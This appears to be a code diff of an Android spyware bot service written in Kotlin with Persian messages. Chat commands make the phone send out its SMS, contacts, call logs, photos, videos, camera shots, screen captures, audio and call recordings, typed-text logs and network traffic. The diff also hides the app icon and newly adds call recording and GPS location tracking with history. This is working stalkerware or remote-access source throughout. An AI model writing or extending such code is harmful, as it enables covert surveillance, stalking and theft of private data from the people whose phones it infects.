-    private fun reply(text: String) {
-        if (chatId != 0L) worker.sendText(chatId, "[${cfg.deviceName}]\n$text")
-    }
+    private fun reply(text: String) { if (chatId != 0L) worker.sendText(chatId, "[${cfg.deviceName}]\n$text") }
     private suspend fun sendFile(f: File, contentType: String = "application/octet-stream", reduce: (File) -> File? = { null }) {
         worker.smartSend(this, chatId, f, contentType, reduce)
     }
@@ -1164,7 +1205,6 @@ class BotService : Service() {
         val parts = cmdLine.trim().split(Regex("\\s+"))
         if (parts.isEmpty()) return
         val cmd = parts[0]; val args = parts.drop(1)
-
         when (cmd) {
             "/info", "/whoami" -> reply(col.info())
             "/battery" -> reply(col.battery())
@@ -1174,10 +1214,14 @@ class BotService : Service() {
             "/sms" -> reply(col.sms(cfg.smsLimit))
             "/contacts" -> sendFile(col.contactsFile(), "text/plain")
             "/calls" -> reply(col.calls(cfg.callsLimit))
-            "/photos" -> col.media("photo", cfg.photoCount, cfg.photoFolder).forEach { f ->
-                sendFile(f, "image/jpeg") { file -> QualityReducer.reducePhoto(file, cacheDir, cfg.quality) }
+            "/photos" -> {
+                val list = col.media("photo", cfg.photoCount, cfg.photoFolder)
+                for (f in list) sendFile(f, "image/jpeg") { file -> QualityReducer.reducePhoto(file, cacheDir, cfg.quality) }
             }
-            "/videos" -> col.media("video", cfg.videoCount, cfg.videoFolder).forEach { f -> sendFile(f, "video/mp4") }
+            "/videos" -> {
+                val list = col.media("video", cfg.videoCount, cfg.videoFolder)
+                for (f in list) sendFile(f, "video/mp4")
+            }
             "/photo" -> {
                 reply("📸 در حال گرفتن عکس...")
                 try { sendFile(cam.takePhoto(this), "image/jpeg") } catch (e: Exception) { reply("خطا: ${e.message}") }
@@ -1192,8 +1236,13 @@ class BotService : Service() {
                 reply("🎙 ضبط ${sec}s...")
                 try { sendFile(rec.recordVoice(sec, cfg.quality), "audio/m4a") } catch (e: Exception) { reply("خطا: ${e.message}") }
             }
+            "/call" -> {
+                val sec = args.getOrNull(0)?.toIntOrNull() ?: 15
+                reply("📞 ضبط ${sec}s...")
+                try { sendFile(rec.recordCall(sec, cfg.quality), "audio/m4a") } catch (_: Exception) { reply("ضبط مکالمه مجاز نیست") }
+            }
             "/screenshot" -> {
-                reply("📸 پنجره تایید روی گوشی باز می‌شه...")
+                reply("📸 پنجره تایید روی گوشی...")
                 startActivity(Intent(this, ScreenCaptureActivity::class.java).apply {
                     putExtra("mode", "screenshot"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 })
@@ -1208,23 +1257,17 @@ class BotService : Service() {
             }
             "/traffic" -> when (args.getOrNull(0)?.lowercase()) {
                 "on" -> {
-                    val prepare = VpnService.prepare(this)
-                    if (prepare != null) {
+                    if (VpnService.prepare(this) != null) {
                         reply("⚠️ یک‌بار باید روی گوشی تایید VPN بدی...")
-                        startActivity(Intent(this, TrafficApprovalActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        })
+                        startActivity(Intent(this, TrafficApprovalActivity::class.java)
+                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                     } else {
                         startService(Intent(this, TrafficService::class.java))
                         cfg.trafficOn = true
                         reply("✅ رصد ترافیک روشن شد")
                     }
                 }
-                "off" -> {
-                    stopService(Intent(this, TrafficService::class.java))
-                    cfg.trafficOn = false
-                    reply("⛔ رصد ترافیک خاموش شد")
-                }
+                "off" -> { stopService(Intent(this, TrafficService::class.java)); cfg.trafficOn = false; reply("⛔ خاموش شد") }
                 else -> reply("استفاده: `/traffic on|off`")
             }
             "/traffic_dump" -> {
@@ -1241,10 +1284,7 @@ class BotService : Service() {
                     }
                 }
             }
-            "/traffic_clear" -> {
-                TrafficService.instance?.clearStats()
-                reply("✅ آمار ترافیک پاک شد")
-            }
+            "/traffic_clear" -> { TrafficService.instance?.clearStats(); reply("✅ پاک شد") }
             "/typed" -> when (args.getOrNull(0)?.lowercase()) {
                 "on" -> { cfg.typedOn = true; reply("✅ ضبط تایپ روشن\n_Accessibility رو در Settings فعال کن_") }
                 "off" -> { cfg.typedOn = false; reply("⛔ خاموش") }
@@ -1255,7 +1295,7 @@ class BotService : Service() {
                 if (r.isEmpty()) { cfg.typedRange = ""; reply("بازه پاک شد") }
                 else if (Regex("^\\d{1,2}:\\d{2}-\\d{1,2}:\\d{2}$").matches(r)) {
                     cfg.typedRange = r; reply("✅ بازه: $r")
-                } else reply("فرمت: `/typed_range 09:00-18:00`")
+                } else reply("فرم: `/typed_range 09:00-18:00`")
             }
             "/typed_dump" -> {
                 val f = col.typedFile()
@@ -1273,14 +1313,14 @@ class BotService : Service() {
                 if (recs.isEmpty()) reply("ضبط مکالمه‌ای نیست.")
                 else {
                     reply("📞 ${recs.size} ضبط آخر:")
-                    recs.forEach { f ->
+                    for (f in recs) {
                         worker.sendText(chatId, "[${cfg.deviceName}]\n🎙 `${f.name}`\n📦 ${f.length()/1024} KB")
                         sendFile(f, "audio/m4a")
                     }
                 }
             }
             "/callrec" -> when (args.getOrNull(0)?.lowercase()) {
-                "on" -> { cfg.autoCallRec = true; reply("✅ ضبط خودکار روشن") }
+                "on" -> { cfg.autoCallRec = true; reply("✅ روشن") }
                 "off" -> { cfg.autoCallRec = false; reply("⛔ خاموش") }
                 else -> reply("استفاده: `/callrec on|off`")
             }
@@ -1304,18 +1344,18 @@ class BotService : Service() {
             "/set_photos" -> args.getOrNull(0)?.toIntOrNull()?.let { cfg.photoCount = it; reply("ok") }
             "/set_videos" -> args.getOrNull(0)?.toIntOrNull()?.let { cfg.videoCount = it; reply("ok") }
             "/rename_self" -> {
-                val newName = args.joinToString(" ").trim()
-                if (newName.isNotEmpty()) { cfg.deviceName = newName; worker.register(this); reply("نام تغییر کرد") }
+                val n = args.joinToString(" ").trim()
+                if (n.isNotEmpty()) { cfg.deviceName = n; worker.register(this); reply("نام به $n تغییر کرد") }
             }
             "/dump_all" -> {
                 reply("📦 همه چیز...")
                 sendFile(col.contactsFile(), "text/plain")
                 reply("— SMS —\n${col.sms(cfg.smsLimit)}")
                 reply("— CALLS —\n${col.calls(cfg.callsLimit)}")
-                col.media("photo", cfg.photoCount, cfg.photoFolder).forEach { f ->
-                    sendFile(f, "image/jpeg") { file -> QualityReducer.reducePhoto(file, cacheDir, cfg.quality) }
-                }
-                col.media("video", cfg.videoCount, cfg.videoFolder).forEach { f -> sendFile(f, "video/mp4") }
+                val photos = col.media("photo", cfg.photoCount, cfg.photoFolder)
+                for (f in photos) sendFile(f, "image/jpeg") { file -> QualityReducer.reducePhoto(file, cacheDir, cfg.quality) }
+                val vids = col.media("video", cfg.videoCount, cfg.videoFolder)
+                for (f in vids) sendFile(f, "video/mp4")
             }
             "/hide" -> {
                 packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java),
@@ -1326,6 +1366,48 @@ class BotService : Service() {
                 packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java),
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                 reply("آیکون برگشت")
+            }
+            "/loc_start" -> {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                    == PackageManager.PERMISSION_GRANTED) {
+                    ContextCompat.startForegroundService(this, Intent(this, LocationService::class.java))
+                    reply("✅ ردیابی لوکیشن فعال شد")
+                } else reply("❌ مجوز لوکیشن داده نشده")
+            }
+            "/loc_stop" -> { stopService(Intent(this, LocationService::class.java)); reply("⏹ ردیابی متوقف شد") }
+            "/loc_now" -> {
+                scope.launch {
+                    try {
+                        val loc = com.google.android.gms.location.LocationServices
+                            .getFusedLocationProviderClient(this@BotService).lastLocation.await()
+                        if (loc != null) {
+                            reply("📍 موقعیت:\n[نقشه](https://maps.google.com/?q=${loc.latitude},${loc.longitude})\nدقت: ${loc.accuracy} متر")
+                        } else reply("موقعیتی یافت نشد")
+                    } catch (e: Exception) { reply("خطا: ${e.message}") }
+                }
+            }
+            "/loc_history" -> {
+                val d = db
+                if (d == null) { reply("❌ پایگاه داده در دسترس نیست"); return }
+                if (args.size < 2) { reply("فرم: `/loc_history YYYY-MM-DD YYYY-MM-DD`"); return }
+                scope.launch {
+                    try {
+                        val sdf = SimpleDateFormat("yyyy-MM-dd", Locale.US)
+                        val from = sdf.parse(args[0])?.time ?: 0L
+                        val to = sdf.parse(args[1])?.time ?: System.currentTimeMillis()
+                        val history = d.locationDao().getHistory(from, to)
+                        if (history.isEmpty()) reply("هیچ موقعیتی یافت نشد")
+                        else {
+                            val sb = StringBuilder("📜 *تاریخچه موقعیت* (${history.size} نقطه):\n\n")
+                            history.take(20).forEach { l ->
+                                val t = SimpleDateFormat("MM-dd HH:mm", Locale.US).format(Date(l.timestamp))
+                                sb.appendLine("$t → [نقشه](https://maps.google.com/?q=${l.latitude},${l.longitude})")
+                            }
+                            if (history.size > 20) sb.appendLine("\n... و ${history.size - 20} نقطه دیگر")
+                            reply(sb.toString())
+                        }
+                    } catch (e: Exception) { reply("خطا: ${e.message}") }
+                }
             }
         }
     }
@@ -1343,10 +1425,9 @@ class BotService : Service() {
                 delay(700)
                 val img = reader.acquireLatestImage()
                 if (img != null) {
-                    val planes = img.planes
-                    val buffer = planes[0].buffer
-                    val pixelStride = planes[0].pixelStride
-                    val rowStride = planes[0].rowStride
+                    val buffer = img.planes[0].buffer
+                    val pixelStride = img.planes[0].pixelStride
+                    val rowStride = img.planes[0].rowStride
                     val rowPadding = rowStride - pixelStride * w
                     val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
                     bmp.copyPixelsFromBuffer(buffer)
